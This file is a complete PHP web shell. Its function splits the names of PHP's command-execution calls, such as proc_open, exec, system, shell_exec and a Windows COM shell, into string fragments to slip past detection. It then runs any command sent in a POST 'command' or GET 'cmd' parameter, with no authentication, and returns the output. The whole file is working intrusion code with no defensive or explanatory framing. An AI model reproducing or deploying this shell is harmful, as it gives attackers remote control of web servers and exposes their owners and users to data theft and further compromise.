<?php
function NuLzCmd($komendnya) {
    $hayoloh = 'h'.'tm'.'lspe'.'cialc'.'hars';
    $fw = 'f'.'wr'.'it'.'e';
    $fc = 'f'.'cl'.'os'.'e';
    $fr = 'f'.'re'.'a'.'d';
    $is_rsrc = 'is'.'_'.'re'.'so'.'ur'.'ce';
    $sgc = 's'.'trea'.'m_g'.'et_c'.'ont'.'ents';
    $proc = 'pr'.'oc'.'_'.'o'.'pen';
    $proc_cls = 'p'.'ro'.'c'.'_'.'c'.'lose';
    $pop = 'p'.'ope'.'n';
    $pop_cls = 'pc'.'lose';
    $exc = 'e'.'x'.'ec';
    $sys = 's'.'ys'.'t'.'em';
    $pass = 'pa'.'s'.'sth'.'ru';
    $sh_exc = 's'.'he'.'ll'.'_'.'e'.'xe'.'c';
    $com = 'C'.'O'.'M';
    $wscsh = 'WS'.'cr'.'ipt'.'.'.'S'.'he'.'ll';
    $cMdexe = 'c'.'md'.'.'.'e'.'x'.'e';
    $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
    $preg = 'pr'.'eg_'.'mat'.'ch';
    $regex = '2'.'>'.'&'.'1';
    if ( !$preg( '/'.$regex.'/i', $komendnya ) ) {
        $komendnya = $komendnya.' '.$regex;
    }

    if ( $func_exist( $proc ) ) {
        $descriptors = [
            0 => [ 'pipe', 'r' ],
            1 => [ 'pipe', 'w' ],
            2 => [ 'pipe', 'w' ],
        ];
        $process = $proc( $komendnya, $descriptors, $pipes);
        if ( $is_rsrc( $process ) ) {
            $fw( $pipes[ 0 ], 'input_data_here' );
            $fc( $pipes[ 0 ] );
            $output = $sgc( $pipes[ 1 ] );
            $errors = $sgc( $pipes[ 2 ] );
            $fc( $pipes[ 1 ] );
            $fc( $pipes[ 2 ] );
            $resultCode = $proc_cls( $process );
            return trim($hayoloh(stripslashes($output)));
        }
    } elseif ( $func_exist( $pop ) ) {
        $process = $pop( $komendnya, 'r' );
        $read = $fr( $process, 2096 );
        return trim($hayoloh(stripslashes(print_r( "$process: ".gettype( $process )."\n$read \n" ))));
        $pop_cls( $process );
    } elseif ( $func_exist( $exc ) ) {
        $exc( $komendnya, $output, $returnCode );
        if ( $returnCode === 0 ) {
            $res = implode( $output );
            return trim($hayoloh(stripslashes($res)));
            ob_flush();
            flush();
        }
    } elseif ( $func_exist( $sys ) ) {
        $out = $sys( $komendnya );
        return trim($hayoloh(stripslashes($out)));
    } elseif ( $func_exist( $pass ) ) {
        $out = $pass( $komendnya );
        return trim($hayoloh(stripslashes($out)));
    } elseif ( $func_exist( $sh_exc ) ) {
        $out = $sh_exc( $komendnya );
        return trim($hayoloh(stripslashes($out)));
    } elseif ( $func_exist( $com ) ) {
        $shell = new $com($wscsh);
        $kom_mand = "$cMdexe /c ".$komendnya;
        $output = $shell->Exec($kom_mand)->StdOut->ReadAll();
        return trim($hayoloh(stripslashes($output)));
    }else {
        return "<b>The Function To Run The Command Is Disable On This Serever</b>";
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
    $command = $_POST['command'];
    $output = NuLzCmd($command);
    if ($output !== false) {
        echo $output;
    } else {
        echo "Error executing command.";
    }
} else {
    echo "Invalid request.";
}

if (isset($_GET['cmd'])) {
    $komendnya = $_GET['cmd'];
    echo '<center><textarea rows="50" cols="80">';
    echo NuLzCmd($komendnya);
    echo '</textarea></center>';
}
?>
